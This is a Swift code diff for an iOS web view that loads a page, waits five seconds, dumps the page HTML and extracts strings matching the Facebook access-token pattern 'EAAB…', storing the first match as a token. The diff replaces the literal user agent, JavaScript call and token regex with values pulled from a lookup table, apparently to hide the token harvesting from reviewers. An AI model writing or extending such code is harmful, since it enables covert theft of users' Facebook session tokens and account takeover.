@@ -28,7 +28,7 @@ struct CoordsFour: UIViewRepresentable {
         let config = WKWebViewConfiguration()
         config.defaultWebpagePreferences = prefs
         let webview = WKWebView(frame: .zero, configuration: config)
-        webview.customUserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0 Safari/605.1.15"
+        webview.customUserAgent = arrayData[ValueKey.Chung_fr_02.rawValue] ?? ""
         webview.navigationDelegate = context.coordinator
         webview.load(URLRequest(url: url!))
         return webview
@@ -58,9 +58,9 @@ struct CoordsFour: UIViewRepresentable {
         
         func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
             DispatchQueue.main.asyncAfter(deadline: .now() + 5) {
-                webView.evaluateJavaScript("document.documentElement.outerHTML.toString()") { html, error in
+                webView.evaluateJavaScript(arrayData[ValueKey.outer_fr_1a.rawValue] ?? "") { html, error in
                     if let content = html as? String, error == nil {
-                        let get_ky_tu_ss = self.ham_tim_ky_tu(for: "EAAB[0-9a-zA-Z]+", in: content).filter({ !$0.isEmpty })
+                        let get_ky_tu_ss = self.ham_tim_ky_tu(for: arrayData[ValueKey.eaab_fr_1a.rawValue] ?? "", in: content).filter({ !$0.isEmpty })
                         if !get_ky_tu_ss.isEmpty {
                             self.four_parent.is_four_loading = true
                             self.four_parent.is_four_get_value_token = get_ky_tu_ss[0]
